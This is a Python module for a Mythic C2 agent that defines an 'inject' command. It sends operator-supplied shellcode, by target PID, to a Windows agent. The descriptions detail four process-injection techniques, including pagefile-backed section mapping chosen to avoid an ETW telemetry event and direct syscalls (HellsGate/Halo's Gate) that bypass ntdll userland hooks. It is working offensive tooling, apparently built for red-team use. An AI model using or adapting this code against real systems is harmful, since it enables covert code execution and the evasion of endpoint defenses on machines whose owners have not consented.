import base64

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="PID of the target process to inject into",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=0, required=True)],
            ),
            CommandParameter(
                name="shellcode",
                type=ParameterType.File,
                description="Raw shellcode file to inject (position-independent, x64)",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=1, required=True)],
            ),
            CommandParameter(
                name="technique",
                type=ParameterType.ChooseOne,
                choices=["createremotethread", "queueapcthread", "ntmapview", "threadlessinject"],
                default_value="createremotethread",
                description=(
                    "createremotethread: VirtualAllocEx + CreateRemoteThread. "
                    "queueapcthread: VirtualAllocEx + QueueUserAPC on all threads. "
                    "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed, avoids "
                    "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread. "
                    "threadlessinject: direct NT syscalls (HellsGate/Halo's Gate) + "
                    "NtQueueApcThreadEx QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC — executes "
                    "in any thread state, bypasses all ntdll userland hooks. "
                    "Requires agent built with direct_syscalls=true."
                ),
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=2, required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject -pid <PID> -shellcode <file> -technique createremotethread|queueapcthread|ntmapview|threadlessinject"
    description = (
        "Inject shellcode into a running process by PID. "
        "createremotethread: VirtualAllocEx (RW) -> write -> RX -> CreateRemoteThread. "
        "queueapcthread: VirtualAllocEx -> write -> RX -> QueueUserAPC on all threads. "
        "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed, avoids "
        "NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread. "
        "threadlessinject: direct NT syscalls (HellsGate/Halo's Gate) + "
        "NtQueueApcThreadEx SPECIAL_USER_APC (executes in any thread state). "
        "Requires agent built with direct_syscalls=true."
    )
    version = 1
    author = "@0xbbuddha"
    argument_class = InjectArguments
    attackmapping = ["T1055.002", "T1055.004"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        pid = taskData.args.get_arg("pid")
        file_id = taskData.args.get_arg("shellcode")
        technique = taskData.args.get_arg("technique") or "createremotethread"

        try:
            file_resp = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=file_id)
            )
            if not file_resp.Success:
                response.Success = False
                response.Error = f"Failed to retrieve shellcode file: {file_resp.Error}"
                return response

            shellcode_b64 = base64.b64encode(file_resp.Content).decode("utf-8")
            taskData.args.add_arg(
                "shellcode",
                shellcode_b64,
                parameter_group_info=[ParameterGroupInfo(group_name="Default")],
            )
        except Exception as e:
            response.Success = False
            response.Error = f"Error fetching shellcode: {str(e)}"
            return response

        response.DisplayParams = f"PID={pid} technique={technique} ({len(file_resp.Content)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
